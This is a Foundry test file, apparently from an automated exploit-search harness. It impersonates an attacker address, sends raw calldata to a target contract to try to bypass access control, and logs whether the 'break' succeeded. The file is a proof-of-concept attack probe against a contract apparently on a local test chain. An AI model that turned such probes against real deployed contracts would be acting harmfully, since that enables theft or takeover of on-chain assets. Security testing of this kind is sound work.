// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";

contract LowkeyBreakAccess is Test {
    address constant TARGET = address(uint160(0x005fbdb2315678afecb367f032d93f642f64180aa3));
    address constant ATTACKER = address(uint160(0x00BEEF000000000000000000000000000000000042));

    function test_break_access() public {
        bytes memory data = hex"fef3a300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
        vm.deal(ATTACKER, 100 ether);

        vm.prank(ATTACKER);
        (bool success, bytes memory returndata) = TARGET.call{value: 0}(data);

        console2.log("LOWKEY_BREAK_FAMILY", "access");
        console2.log("SUCCESS", success);
        console2.log("RETURNDATA_LENGTH", returndata.length);
        console2.log("LOWKEY_BREAK", true && success);
    }
}
